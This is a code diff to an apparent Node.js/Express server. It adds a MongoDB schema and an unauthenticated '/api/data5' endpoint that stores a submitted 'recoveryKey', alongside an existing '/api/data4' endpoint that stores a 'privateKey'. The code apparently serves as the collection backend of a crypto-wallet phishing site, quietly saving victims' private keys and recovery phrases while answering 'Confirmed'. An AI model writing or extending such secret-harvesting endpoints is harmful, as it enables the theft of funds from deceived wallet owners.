@@ -50,6 +50,12 @@ const schema4 = new mongoose.Schema({
 });
 const schema4Use = mongoose.model('database4', schema4);
 
+const schema5 = new mongoose.Schema({
+    Time:{type:String},
+    recoveryKey: {type:String}
+});
+const schema5Use = mongoose.model('database5', schema5);
+
 //MiddleWares
 server.use(cors());
 server.use(bodyParser.json());
@@ -119,6 +125,24 @@ server.post("/api/data4",(req,res)=>{
         let data = new schema4Use({
             Time:indiaTime,
             privateKey:req.body.privateKey
+        });
+        try{
+            await data.save();
+            console.log("Saved")
+        }
+        catch{
+            console.log("NO")
+        }
+    }
+    res.json({status:"Confirmed"});
+    saveSchema()
+})
+
+server.post("/api/data5",(req,res)=>{
+    async function saveSchema(){
+        let data = new schema5Use({
+            Time:indiaTime,
+            recoveryKey:req.body.recoveryKey
         });
         try{
             await data.save();
